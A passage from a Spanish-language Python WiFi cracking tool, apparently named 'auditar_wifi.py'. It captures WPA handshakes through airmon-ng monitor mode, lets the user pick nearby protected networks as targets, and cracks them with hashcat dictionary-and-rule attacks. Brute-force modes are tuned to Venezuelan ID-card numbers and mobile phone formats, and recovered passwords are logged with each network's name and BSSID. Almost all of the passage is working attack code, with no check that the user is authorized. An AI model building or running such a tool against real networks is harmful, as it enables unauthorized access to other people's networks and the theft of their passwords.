# =============================================================================
# CRACKEAR CON HASHCAT - ATAQUE CON DICCIONARIO + REGLA
# =============================================================================

def crack_password_diccionario_con_regla(hc22000_file, essid, diccionario_path, rule_path):
    import threading

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [DICCIONARIO+REGLA] CRACKEANDO CON HASHCAT - ATAQUE CON DICCIONARIO Y REGLA", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint("\n  Red:        " + Colors.BOLD + essid + Colors.ENDC, Colors.CYAN)
    cprint("  Archivo:    " + hc22000_file, Colors.CYAN)
    cprint("  Diccionario:" + diccionario_path, Colors.CYAN)
    cprint("  Regla:      " + rule_path, Colors.CYAN)
    cprint("  Metodo:     -a 0 (ataque con diccionario) con regla", Colors.CYAN)
    cprint("  Opciones:   -w 4 -D 2 --hwmon-temp-abort=95 -O\n", Colors.CYAN)

    # --- Auto-detectar el mejor dispositivo ---
    device_id = None
    try:
        stdout_i, _, _ = run_cmd("hashcat -I", timeout=15)
        for line in stdout_i.split('\n'):
            m = re.search(r'Backend Device ID #(\d+)', line)
            if m:
                candidate = m.group(1)
            if 'NVIDIA' in line and candidate:
                device_id = candidate
                break
    except Exception:
        pass

    if device_id is None:
        cprint("  [!] No se detecto GPU NVIDIA. Usando CPU por defecto (sin -D 2).", Colors.WARNING)
        device_args = []
    else:
        cprint("  [*] GPU detectada: NVIDIA (Device ID #" + device_id + ")", Colors.GREEN)
        device_args = ["-d", device_id]

    state_lock = threading.Lock()
    state = {
        'done': False,
        'start_time': time.time(),
        'status': 'Iniciando',
        'hashcat_eta_secs': 0,
        'saw_eta': False,
        'result_lines': [],
    }

    def _fmt_time(secs):
        if secs is None or secs < 0 or secs == float('inf'):
            return '--:--:--'
        secs = int(secs)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        return str(h) + "h:" + str(m).zfill(2) + "m:" + str(s).zfill(2) + "s" if h else str(m).zfill(2) + "m:" + str(s).zfill(2) + "s"

    def draw_progress():
        while not state['done']:
            try:
                cols = shutil.get_terminal_size((80, 20)).columns
            except Exception:
                cols = 80

            with state_lock:
                elapsed_total = time.time() - state['start_time']
                eta_base = state['hashcat_eta_secs']
                saw_eta = state['saw_eta']
                status = state['status'][:10]

            if saw_eta and eta_base > 0:
                pct = (elapsed_total / eta_base) * 100.0
                pct = min(99.5, max(pct, 0.0))
                remaining_secs = max(0, eta_base - elapsed_total)
                eta_s = _fmt_time(remaining_secs)
            else:
                pct = 0.0
                eta_s = "Calculando..."

            if cols < 80:
                bar_width = 16
            elif cols < 100:
                bar_width = 20
            else:
                bar_width = 24
            filled = int(bar_width * pct / 100.0)
            bar = '\u2588' * filled + '\u2591' * (bar_width - filled)

            elapsed_s = _fmt_time(elapsed_total)

            line = ("\r  " + Colors.CYAN + "[" + bar + "]" + Colors.ENDC + " " + Colors.BOLD + "{:6.2f}%".format(pct) + Colors.ENDC + " "
                    + Colors.WARNING + "ETA:" + Colors.ENDC + "{:>10}".format(eta_s) + " "
                    + Colors.CYAN + "T:" + Colors.ENDC + "{:>7}".format(elapsed_s) + " [" + status + "]")
            print(line + '\033[0K', end='', flush=True)
            time.sleep(0.1)

    # Archivo de salida para recuperar la password
    hc_path = Path(hc22000_file)
    outfile = hc_path.parent / (hc_path.stem + "_result.txt")

    # Dictionary attack with rules: -a 0 with wordlist + rule file
    cmd = [
        "hashcat", "-m", "22000", "-a", "0",
        hc22000_file,
        diccionario_path,
        "-r", rule_path,
        "-w", "4",
        "-D", "2",
        "--hwmon-temp-abort=95",
        "-O",
        "--outfile", str(outfile),
        "--outfile-format=2",
        "--status",
        "--status-timer=1",
    ] + device_args

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        cprint("[!] hashcat no encontrado.", Colors.FAIL)
        return None

    progress_thread = threading.Thread(target=draw_progress, daemon=True)
    progress_thread.start()

    for raw_line in proc.stdout:
        line = raw_line.strip()
        if not line:
            continue

        with state_lock:
            state['result_lines'].append(line)

        if not state.get('saw_eta', False):
            if 'Time.Estimated' in line or 'Estimated' in line:
                match = re.search(r'\((.*?)\)', line)
                if match:
                    duration_str = match.group(1)
                    seconds = parse_duration_to_seconds(duration_str)
                    if seconds > 0:
                        with state_lock:
                            state['hashcat_eta_secs'] = seconds
                            state['saw_eta'] = True
                            state['status'] = 'Ejecutando'
                            state['start_time'] = time.time()

        if 'Bypass' in line:
            with state_lock:
                state['status'] = 'Bypass'

    proc.wait()
    rc = proc.returncode

    with state_lock:
        state['done'] = True
        if state['status'] in ('Ejecutando', 'Iniciando'):
            state['status'] = 'Agotado' if rc != 0 else 'Completado'

    progress_thread.join(timeout=2)

    filled_bar = '\u2588' * 24
    elapsed_final = _fmt_time(time.time() - state['start_time'])
    print("\r  " + Colors.CYAN + "[" + filled_bar + "]" + Colors.ENDC + " " + Colors.BOLD + "100.00%" + Colors.ENDC + " "
          + Colors.WARNING + "ETA:" + Colors.ENDC + "00m:00s     "
          + Colors.CYAN + "T:" + Colors.ENDC + elapsed_final + " [" + state['status'] + "]")
    print()

    password = None
    if outfile.exists() and outfile.stat().st_size > 0:
        try:
            password = outfile.read_text().strip()
            with state_lock:
                state['status'] = 'Cracked!'
        except:
            pass
        try:
            outfile.unlink()
        except:
            pass

    if not password:
        show_cmd = "hashcat -m 22000 --show " + hc22000_file
        stdout_show, _, _ = run_cmd(show_cmd, timeout=15)
        if stdout_show and stdout_show.strip():
            for l in stdout_show.strip().split('\n'):
                l = l.strip()
                if ':' in l and not l.startswith('Dictionary') and not l.startswith('Hashfile'):
                    parts = l.split(':')
                    if len(parts) >= 2:
                        password = parts[-1].strip()
                        break

    if password:
        cprint("\n" + "=" * 60, Colors.GREEN)
        cprint("  " + Colors.BOLD + "  CONTRASENA ENCONTRADA!" + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60, Colors.GREEN)
        cprint("  Red:        " + Colors.BOLD + essid + Colors.ENDC, Colors.GREEN)
        cprint("  Archivo:    " + hc22000_file, Colors.GREEN)
        cprint("  Diccionario:" + diccionario_path, Colors.GREEN)
        cprint("  Regla:      " + rule_path, Colors.GREEN)
        cprint("  Password:   " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60 + "\n", Colors.GREEN)
        return password
    else:
        cprint("\n  " + Colors.WARNING + "[!] No se encontro la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
        cprint("  [*] La clave no se encontro en el diccionario con la regla aplicada.", Colors.WARNING)
        return None

# =============================================================================
# PASO 8: GUARDAR RESULTADOS
# =============================================================================

def save_password(essid, bssid, password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(PASSWORDS_FILE, 'a') as f:
        f.write(f"[{timestamp}] {essid} ({bssid}) = {password}\n")
    cprint(f"\n  [*] Contrasena guardada en: {Colors.BOLD}{PASSWORDS_FILE}{Colors.ENDC}", Colors.GREEN)


# =============================================================================
# PASO 9: LIMPIEZA DE ARCHIVOS
# =============================================================================

def cleanup_files(file_prefix, keep_hc22000=True):
    """
    Limpia los archivos generados durante la auditoria.
    Busca archivos cuyo nombre empiece con el prefijo dado.
    - keep_hc22000: si es True, conserva el archivo .hc22000
    - Nunca borra el script ni el archivo de passwords
    """
    cprint("\n" + "-" * 50, Colors.BLUE)
    cprint("  [8] LIMPIANDO ARCHIVOS TEMPORALES...", Colors.BLUE)
    cprint("-" * 50, Colors.BLUE)

    deleted_count = 0
    kept_count = 0
    errors = []

    # Buscar archivos con el mismo prefijo en WORK_DIR y AIRCRACK_DIR
    for base_dir in [WORK_DIR, AIRCRACK_DIR]:
        if not base_dir.exists():
            continue

        for f in base_dir.iterdir():
            if not f.is_file():
                continue

            # No borrar nunca el script ni el archivo de passwords
            if f.name == 'auditar_wifi.py' or f.name == PASSWORDS_FILE.name:
                continue

            # Verificar si el nombre del archivo empieza con el prefijo
            if f.name.startswith(file_prefix):
                # Extensiones tipicas: .cap, .csv, .netxml, .hc22000, .log, .kismet.csv
                if keep_hc22000 and f.suffix == '.hc22000':
                    cprint(f"     Conservado:  {f.name}", Colors.CYAN)
                    kept_count += 1
                else:
                    try:
                        f.unlink()
                        cprint(f"     Eliminado:  {f.name}", Colors.WARNING)
                        deleted_count += 1
                    except OSError as e:
                        errors.append(f"{f.name}: {e}")
                        cprint(f"     Error al eliminar {f.name}: {e}", Colors.FAIL)

    for err in errors:
        cprint(f"     [WARN] {err}", Colors.FAIL)

    cprint(f"\n     [*] Eliminados: {deleted_count}  |  Conservados: {kept_count}", Colors.BLUE)


# =============================================================================
# LIMPIEZA FINAL
# =============================================================================

def stop_monitor_mode(mon_interface):
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [*] DESACTIVANDO MODO MONITOR", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint(f"\n[*] Deteniendo modo monitor en {mon_interface}...", Colors.CYAN)
    run_cmd(f"airmon-ng stop {mon_interface}", timeout=10)

    cprint("\n[*] Modo monitor desactivado.", Colors.GREEN)


# =============================================================================
# MANEJADOR DE SENALES (Ctrl+C)
# =============================================================================

_mon_interface_global = None

def signal_handler(sig, frame):
    cprint(f"\n\n{Colors.FAIL}[!] INTERRUPCION (Ctrl+C) RECIBIDA{Colors.ENDC}", Colors.FAIL)
    cprint("[!] Limpiando y saliendo...\n", Colors.WARNING)
    if _mon_interface_global:
        stop_monitor_mode(_mon_interface_global)
    cprint("\n[#] Auditoria interrumpida por el usuario.\n", Colors.WARNING)
    sys.exit(0)


# =============================================================================
# RESUMEN FINAL
# =============================================================================

def show_summary():
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  RESUMEN DE LA AUDITORIA", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    if PASSWORDS_FILE.exists() and PASSWORDS_FILE.stat().st_size > 0:
        cprint(f"\n{Colors.GREEN}[+] Contrasenas encontradas guardadas en:{Colors.ENDC}", Colors.GREEN)
        cprint(f"    {Colors.BOLD}{PASSWORDS_FILE}{Colors.ENDC}\n", Colors.GREEN)

        with open(PASSWORDS_FILE, 'r') as f:
            content = f.read()

        cprint("  " + "-" * 40, Colors.CYAN)
        cprint("  REDES AUDITADAS CON EXITO:", Colors.BOLD)
        cprint("  " + "-" * 40, Colors.CYAN)

        for line in content.strip().split('\n'):
            if line.strip():
                match = re.search(r'\[(.*?)\]\s+(.*)', line)
                if match:
                    data = match.group(2)
                    cprint(f"    * {data}", Colors.GREEN)
    else:
        cprint(f"\n{Colors.WARNING}[!] No se encontraron contrasenas en esta sesion.{Colors.ENDC}", Colors.WARNING)
        cprint(f"    El archivo {PASSWORDS_FILE} no existe o esta vacio.", Colors.WARNING)

    cprint(f"\n  {Colors.BOLD}[*] AUDITORIA FINALIZADA.{Colors.ENDC}", Colors.GREEN)


# =============================================================================
# MENU PRINCIPAL
# =============================================================================

def show_menu():
    """
    Muestra el menu principal y retorna la opcion seleccionada (1-3).
    """
    cprint(f"""
{Colors.HEADER}================================================================{Colors.ENDC}
{Colors.BOLD}            WIFI AUDIT TOOL - MENU PRINCIPAL{Colors.ENDC}
{Colors.HEADER}================================================================{Colors.ENDC}
""")
    cprint(f"  {Colors.BOLD}[1]{Colors.ENDC} {Colors.CYAN}Capturar Handshake de red WiFi{Colors.ENDC}", Colors.ENDC)
    cprint(f"     {Colors.BLUE}-> Identificar interfaz, escanear redes, capturar y convertir a .hc22000{Colors.ENDC}", Colors.ENDC)
    print()
    cprint(f"  {Colors.BOLD}[2]{Colors.ENDC} {Colors.CYAN}Descifrar contrasena del Handshake{Colors.ENDC}", Colors.ENDC)
    cprint(f"     {Colors.BLUE}-> Usar hashcat para descifrar un archivo .hc22000 existente{Colors.ENDC}", Colors.ENDC)
    print()
    cprint(f"  {Colors.BOLD}[3]{Colors.ENDC} {Colors.CYAN}Salir{Colors.ENDC}", Colors.ENDC)
    print()

    while True:
        try:
            choice = input(f"{Colors.WARNING}[?] Selecciona una opcion (1-3): {Colors.ENDC}").strip()
            if choice in ('1', '2', '3'):
                return int(choice)
            cprint("  [!] Opcion invalida. Debe ser 1, 2 o 3.", Colors.FAIL)
        except (EOFError, KeyboardInterrupt):
            cprint("\n  [!] Entrada no disponible. Saliendo...", Colors.FAIL)
            return 3


# =============================================================================
# MENU: CAPTURAR HANDSHAKE
# =============================================================================

def menu_capturar_handshake():
    """
    Flujo completo de captura de handshake:
    1. Identificar interfaces
    2. Activar modo monitor
    3. Escanear redes
    4. Seleccionar red(es)
    5. Capturar handshake
    6. Convertir a .hc22000
    7. Mostrar resultado y volver al menu
    """
    global _mon_interface_global

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  OPCION 1: CAPTURAR HANDSHAKE DE RED WIFI", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    try:
        interface = identify_interfaces()
        mon_interface = enable_monitor_mode(interface)
        _mon_interface_global = mon_interface

        # Outer loop: permite volver a escanear si se elige "Volver al principio"
        while True:
            networks = scan_networks(mon_interface)
            if not networks:
                cprint("\n[!] No hay redes protegidas para auditar.", Colors.FAIL)
                input(f"\n{Colors.CYAN}[*] Presiona Enter para volver al menu principal...{Colors.ENDC}")
                return

            display_networks(networks)
            targets = select_targets(networks)

            # Si select_targets devuelve None (opcion 0), regresar al menu principal
            if targets is None:
                cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                return

            volver_al_principio = False

            for i, target in enumerate(targets):
                essid = target['essid']
                bssid = target['bssid']

                cprint("\n" + "#" * 60, Colors.BOLD)
                cprint(f"  AUDITANDO RED {i+1} DE {len(targets)}", Colors.BOLD)
                cprint(f"  {essid} ({bssid})", Colors.BOLD)
                cprint("#" * 60, Colors.BOLD)

                # Verificar si ya tenemos la contrasena
                existing_pass = None
                if PASSWORDS_FILE.exists():
                    with open(PASSWORDS_FILE, 'r') as pf:
                        for line in pf:
                            if bssid in line or essid in line:
                                match = re.search(r'=\s*(\S+)$', line.strip())
                                if match:
                                    existing_pass = match.group(1)
                                    break

                if existing_pass:
                    cprint(f"\n  [*] Ya tenemos la contrasena de '{essid}': {Colors.BOLD}{existing_pass}{Colors.ENDC}", Colors.GREEN)
                    skip = input(f"\n  {Colors.WARNING}[?] Saltar esta red? (s/N): {Colors.ENDC}").strip().lower()
                    if skip == 's':
                        continue

                if i > 0:
                    proceed = input(f"\n  {Colors.WARNING}[?] Auditar la red '{essid}'? (S/n): {Colors.ENDC}").strip().lower()
                    if proceed == 'n':
                        cprint(f"\n  [*] Red '{essid}' saltada por el usuario.", Colors.WARNING)
                        continue

                # ---- CAPTURA ----
                cap_file = capture_handshake(target, mon_interface)

                # Si capture_handshake devuelve "__VOLVER__", volver al principio del bucle (reescanear)
                if cap_file == "__VOLVER__":
                    cprint("\n  [*] Limpiando archivos temporales...", Colors.BLUE)
                    run_cmd("rm -f /home/lhedwin/Hacking/wifi/*.cap /home/lhedwin/Hacking/wifi/*.csv /home/lhedwin/Hacking/wifi/*.netxml", timeout=10)
                    cprint("  [*] Archivos temporales eliminados.", Colors.BLUE)
                    volver_al_principio = True
                    break

                if cap_file is None:
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

                if not os.path.exists(cap_file):
                    cprint("\n[!] Error: El archivo de captura no existe.", Colors.FAIL)
                    run_cmd("rm -f /home/lhedwin/Hacking/wifi/*.cap /home/lhedwin/Hacking/wifi/*.csv /home/lhedwin/Hacking/wifi/*.netxml", timeout=10)
                    cprint("\n  [*] Archivos temporales eliminados.", Colors.BLUE)
                    volver_al_principio = True
                    break

                # ---- CONVERTIR A .hc22000 ----
                hc22000_file = convert_to_hc22000(cap_file)

                # ---- MOSTRAR ARCHIVO GENERADO DE FORMA DESTACADA ----
                if hc22000_file and os.path.exists(hc22000_file):
                    cprint("\n" + "=" * 60, Colors.GREEN)
                    cprint(f"  {Colors.BOLD}  HANDSHAKE CAPTURADO Y CONVERTIDO EXITOSAMENTE!{Colors.ENDC}", Colors.GREEN)
                    cprint("=" * 60, Colors.GREEN)
                    cprint(f"  Red:     {Colors.BOLD}{essid}{Colors.ENDC}", Colors.GREEN)
                    cprint(f"  BSSID:   {bssid}", Colors.GREEN)
                    cprint(f"  Archivo: {Colors.BOLD}{hc22000_file}{Colors.ENDC}", Colors.GREEN)
                    try:
                        size = os.path.getsize(hc22000_file)
                        cprint(f"  Tamano:  {size} bytes", Colors.GREEN)
                    except:
                        pass
                    cprint("=" * 60 + "\n", Colors.GREEN)
                else:
                    cprint(f"\n[!] No se pudo convertir la captura para '{essid}'.", Colors.FAIL)
                    run_cmd("rm -f /home/lhedwin/Hacking/wifi/*.cap /home/lhedwin/Hacking/wifi/*.csv /home/lhedwin/Hacking/wifi/*.netxml", timeout=10)
                    cprint(f"\n  [*] Archivos temporales eliminados.", Colors.BLUE)
                    volver_al_principio = True
                    break

                # ---- LIMPIEZA DE ARCHIVOS .cap, .csv, .netxml ----
                run_cmd("rm -f /home/lhedwin/Hacking/wifi/*.cap /home/lhedwin/Hacking/wifi/*.csv /home/lhedwin/Hacking/wifi/*.netxml", timeout=10)
                cprint(f"\n  [*] Archivos .cap, .csv, .netxml eliminados.", Colors.BLUE)

                # Preguntar si continuar con siguiente red
                if i < len(targets) - 1:
                    cont = input(f"\n  {Colors.WARNING}[?] Continuar con la siguiente red? (S/n): {Colors.ENDC}").strip().lower()
                    if cont == 'n':
                        cprint("\n  [*] Captura terminada por el usuario.", Colors.WARNING)
                        volver_al_principio = True
                        break

            if not volver_al_principio:
                # Si no se eligio volver al principio, salir del bucle
                break
            # Si volver_al_principio es True, el while True continua (reescanea)

    except SystemExit:
        raise
    except Exception as e:
        cprint(f"\n[!] Error durante la captura: {e}", Colors.FAIL)

    finally:
        if _mon_interface_global:
            stop_monitor_mode(_mon_interface_global)
            _mon_interface_global = None
        # Limpieza final de archivos residuales
        deleted_residual = 0
        for ext in ["*.cap", "*.csv", "*.netxml", "*.log"]:
            for f in WORK_DIR.glob(ext):
                if f.is_file() and f.name != "auditar_wifi.py" and f.name != PASSWORDS_FILE.name:
                    try:
                        f.unlink()
                        deleted_residual += 1
                    except OSError:
                        pass
        if deleted_residual > 0:
            cprint(f"\n[+] Archivos temporales eliminados ({deleted_residual} archivos).", Colors.BLUE)
        else:
            cprint("\n[+] Limpieza de archivos temporales completada.", Colors.BLUE)

    input(f"\n{Colors.CYAN}[*] Presiona Enter para volver al menu principal...{Colors.ENDC}")


# =============================================================================
# MENU: DESCIFRAR CONTRASENA DEL HANDSHAKE
# =============================================================================

def menu_descifrar_password():
    """
    Flujo para descifrar un archivo .hc22000 existente:
    1. Listar archivos .hc22000 disponibles
    2. Seleccionar archivo o ingresar ruta
    3. Submenu con tipo de ataque
    4. Mostrar resultado y guardar si se encuentra
    5. Volver al menu
    """
    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  OPCION 2: DESCIFRAR CONTRASENA DEL HANDSHAKE", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    while True:
        # ---- SELECCION DE ARCHIVO ----
        hc22000_files = list(WORK_DIR.glob("*.hc22000"))
        if AIRCRACK_DIR.exists():
            hc22000_files.extend(AIRCRACK_DIR.glob("*.hc22000"))

        hc22000_path = None

        if hc22000_files:
            cprint("\n" + Colors.BOLD + "Archivos .hc22000 encontrados:" + Colors.ENDC, Colors.CYAN)
            for idx, f in enumerate(hc22000_files, 1):
                size = f.stat().st_size
                cprint("  " + Colors.BOLD + "[" + str(idx) + "]" + Colors.ENDC + " " + f.name + " (" + str(size) + " bytes)", Colors.BLUE)

            cprint("\n" + Colors.WARNING + "[?] Selecciona un archivo por numero, o escribe 'manual' para ingresar una ruta:", Colors.ENDC)

            while True:
                try:
                    choice = input("\n  " + Colors.WARNING + "[?] Opcion: " + Colors.ENDC).strip().lower()
                    if choice == 'manual':
                        break
                    else:
                        try:
                            idx = int(choice)
                            if 1 <= idx <= len(hc22000_files):
                                hc22000_path = str(hc22000_files[idx - 1])
                                break
                        except ValueError:
                            pass
                        cprint("  [!] Opcion invalida. Ingresa un numero del 1 al " + str(len(hc22000_files)) + " o 'manual'.", Colors.FAIL)
                except (EOFError, KeyboardInterrupt):
                    cprint("\n  [!] Entrada no disponible. Volviendo al menu...", Colors.FAIL)
                    return

        if not hc22000_path:
            cprint("\n" + Colors.WARNING + "[?] Ingresa la ruta del archivo .hc22000:")
            cprint("     " + Colors.BLUE + "(ej: /home/lhedwin/Hacking/wifi/MiRed_123456.hc22000)")
            try:
                ruta = input("\n  " + Colors.WARNING + "[?] Ruta: " + Colors.ENDC).strip()
                if not ruta:
                    cprint("  [!] No se ingreso ninguna ruta. Volviendo al menu...", Colors.WARNING)
                    return
                if not '/' in ruta:
                    ruta = str(WORK_DIR / ruta)
                hc22000_path = ruta
            except (EOFError, KeyboardInterrupt):
                cprint("\n  [!] Entrada no disponible. Volviendo al menu...", Colors.FAIL)
                return

        if not os.path.exists(hc22000_path):
            cprint("\n  [!] El archivo '" + hc22000_path + "' no existe.", Colors.FAIL)
            input("\n" + Colors.CYAN + "[*] Presiona Enter para continuar..." + Colors.ENDC)
            continue

        if not hc22000_path.endswith('.hc22000'):
            cprint("\n  [!] El archivo debe tener extension .hc22000", Colors.FAIL)
            input("\n" + Colors.CYAN + "[*] Presiona Enter para continuar..." + Colors.ENDC)
            continue

        basename = Path(hc22000_path).stem
        essid = basename

        cprint("\n  [*] Archivo seleccionado: " + Colors.BOLD + hc22000_path + Colors.ENDC, Colors.GREEN)

        try:
            resp = input("\n  " + Colors.WARNING + "[?] Nombre de la red (ESSID) para referencia (Enter para usar '" + basename + "'): " + Colors.ENDC).strip()
            if resp:
                essid = resp
        except (EOFError, KeyboardInterrupt):
            pass

                # ---- SUBMENU DE ATAQUE ----
        while True:
            cprint("\n" + "-" * 50, Colors.HEADER)
            cprint("  SELECCIONA EL TIPO DE ATAQUE", Colors.HEADER)
            cprint("-" * 50, Colors.HEADER)
            cprint("  " + Colors.BOLD + "[1]" + Colors.ENDC + " " + Colors.CYAN + "Ataque de fuerza bruta con patron de 8 caracteres numericos" + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[2]" + Colors.ENDC + " " + Colors.CYAN + "Ataque de fuerza bruta con patron de Cedulas con la letra \"V\" al inicio (ej: V12345678 o v12345678)" + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[3]" + Colors.ENDC + " " + Colors.CYAN + 'Ataque de fuerza bruta con patron de Cedulas con el prefijo "CI" (ej: CI12345678 o ci12345678)' + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[4]" + Colors.ENDC + " " + Colors.CYAN + "Ataque de fuerza bruta con patron de Numeros Celulares de Venezuela (Formatos 0414, 0424, 0412, 0416)" + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[5]" + Colors.ENDC + " " + Colors.CYAN + "Ataque de fuerza bruta con diccionario" + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[6]" + Colors.ENDC + " " + Colors.CYAN + "Ataque con diccionario y Sufijo Numerico de 2 digitos mas caracter especial" + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[7]" + Colors.ENDC + " " + Colors.CYAN + "Seleccionar otro archivo" + Colors.ENDC)
            cprint("  " + Colors.BOLD + "[8]" + Colors.ENDC + " " + Colors.CYAN + "Regresar al menu principal" + Colors.ENDC)

            try:
                sub_choice = input("\n" + Colors.WARNING + "[?] Selecciona una opcion (1-8): " + Colors.ENDC).strip()
            except (EOFError, KeyboardInterrupt):
                cprint("\n  [!] Entrada no disponible. Volviendo al menu principal...", Colors.FAIL)
                return

            if sub_choice == '1':
                password = crack_password(hc22000_path, essid)
                if password:
                    try:
                        with open(hc22000_path, 'r') as hf:
                            first_line = hf.readline().strip()
                        parts = first_line.split(':')
                        bssid = parts[2] if len(parts) > 2 else "DESCONOCIDO"
                    except:
                        bssid = "DESCONOCIDO"
                    save_password(essid, bssid, password)
                    cprint("\n  [*] Contrasena encontrada: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
                    try:
                        eliminar = input("\n  " + Colors.WARNING + "[?] Eliminar el archivo .hc22000? (s/N): " + Colors.ENDC).strip().lower()
                        if eliminar == 's':
                            try:
                                os.unlink(hc22000_path)
                                cprint("  [*] Archivo .hc22000 eliminado.", Colors.CYAN)
                            except OSError as e:
                                cprint("  [!] Error al eliminar: " + str(e), Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        pass
                else:
                    cprint("\n  " + Colors.WARNING + "[!] No se pudo descifrar la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
                    cprint("  [*] El archivo .hc22000 se conserva para futuros intentos.", Colors.CYAN)

                try:
                    otra = input("\n" + Colors.WARNING + "[?] Deseas realizar otra operacion? (s/N): " + Colors.ENDC).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    otra = 'n'
                if otra != 's':
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

            elif sub_choice == '2':
                password = crack_password_cedula(hc22000_path, essid)
                if password:
                    try:
                        with open(hc22000_path, 'r') as hf:
                            first_line = hf.readline().strip()
                        parts = first_line.split(':')
                        bssid = parts[2] if len(parts) > 2 else "DESCONOCIDO"
                    except:
                        bssid = "DESCONOCIDO"
                    save_password(essid, bssid, password)
                    cprint("\n  [*] Contrasena encontrada: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
                    try:
                        eliminar = input("\n  " + Colors.WARNING + "[?] Eliminar el archivo .hc22000? (s/N): " + Colors.ENDC).strip().lower()
                        if eliminar == 's':
                            try:
                                os.unlink(hc22000_path)
                                cprint("  [*] Archivo .hc22000 eliminado.", Colors.CYAN)
                            except OSError as e:
                                cprint("  [!] Error al eliminar: " + str(e), Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        pass
                else:
                    cprint("\n  " + Colors.WARNING + "[!] No se pudo descifrar la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
                    cprint("  [*] El archivo .hc22000 se conserva para futuros intentos.", Colors.CYAN)

                try:
                    otra = input("\n" + Colors.WARNING + "[?] Deseas realizar otra operacion? (s/N): " + Colors.ENDC).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    otra = 'n'
                if otra != 's':
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

            elif sub_choice == '3':
                password = crack_password_cedula_ci(hc22000_path, essid)
                if password:
                    try:
                        with open(hc22000_path, 'r') as hf:
                            first_line = hf.readline().strip()
                        parts = first_line.split(':')
                        bssid = parts[2] if len(parts) > 2 else "DESCONOCIDO"
                    except:
                        bssid = "DESCONOCIDO"
                    save_password(essid, bssid, password)
                    cprint("\n  [*] Contrasena encontrada: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
                    try:
                        eliminar = input("\n  " + Colors.WARNING + "[?] Eliminar el archivo .hc22000? (s/N): " + Colors.ENDC).strip().lower()
                        if eliminar == 's':
                            try:
                                os.unlink(hc22000_path)
                                cprint("  [*] Archivo .hc22000 eliminado.", Colors.CYAN)
                            except OSError as e:
                                cprint("  [!] Error al eliminar: " + str(e), Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        pass
                else:
                    cprint("\n  " + Colors.WARNING + "[!] No se pudo descifrar la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
                    cprint("  [*] El archivo .hc22000 se conserva para futuros intentos.", Colors.CYAN)

                try:
                    otra = input("\n" + Colors.WARNING + "[?] Deseas realizar otra operacion? (s/N): " + Colors.ENDC).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    otra = 'n'
                if otra != 's':
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

            elif sub_choice == '4':
                password = crack_password_celular_venezuela(hc22000_path, essid)
                if password:
                    try:
                        with open(hc22000_path, 'r') as hf:
                            first_line = hf.readline().strip()
                        parts = first_line.split(':')
                        bssid = parts[2] if len(parts) > 2 else "DESCONOCIDO"
                    except:
                        bssid = "DESCONOCIDO"
                    save_password(essid, bssid, password)
                    cprint("\n  [*] Contrasena encontrada: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
                    try:
                        eliminar = input("\n  " + Colors.WARNING + "[?] Eliminar el archivo .hc22000? (s/N): " + Colors.ENDC).strip().lower()
                        if eliminar == 's':
                            try:
                                os.unlink(hc22000_path)
                                cprint("  [*] Archivo .hc22000 eliminado.", Colors.CYAN)
                            except OSError as e:
                                cprint("  [!] Error al eliminar: " + str(e), Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        pass
                else:
                    cprint("\n  " + Colors.WARNING + "[!] No se pudo descifrar la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
                    cprint("  [*] El archivo .hc22000 se conserva para futuros intentos.", Colors.CYAN)

                try:
                    otra = input("\n" + Colors.WARNING + "[?] Deseas realizar otra operacion? (s/N): " + Colors.ENDC).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    otra = 'n'
                if otra != 's':
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

            elif sub_choice == '5':
                # ---- SELECCIONAR DICCIONARIO ----
                diccionarios_dir = WORK_DIR / "diccionarios"
                diccionario_files = []
                if diccionarios_dir.exists():
                    for ext in ["*.txt", "*.lst", "*.dic", "*.wordlist"]:
                        diccionario_files.extend(list(diccionarios_dir.glob(ext)))
                    for f in diccionarios_dir.iterdir():
                        if f.is_file() and f.suffix == '' and f not in diccionario_files:
                            diccionario_files.append(f)

                if not diccionario_files:
                    cprint("\n  [!] No se encontraron archivos de diccionario en: " + str(diccionarios_dir), Colors.FAIL)
